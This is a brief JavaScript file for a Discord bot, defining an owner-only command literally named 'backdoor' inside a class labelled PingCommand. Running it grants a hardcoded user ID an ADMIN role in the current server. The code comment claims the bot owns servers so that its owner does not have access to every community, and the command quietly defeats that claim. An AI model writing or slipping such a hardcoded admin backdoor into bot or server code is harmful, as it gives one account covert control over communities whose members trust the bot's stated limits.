const { Command } = require('../../handler')
const ROLE = '431866543492562944'
// Feel free to change this - the bot is supposed to own the server so that the bot owner doesn't have access to every circle.
module.exports = class PingCommand extends Command {
  constructor() {
    super('backdoor', {
      name: 'Backdoor',
      description: 'Give ADMIN role',
      module: 'admin',
      ownerOnly: true
    })
  }
  async run(args, msg, api) {
    await msg.guild.members.get('346676896794279937').addRole(ROLE)
    return api.success('Done!')
  }
}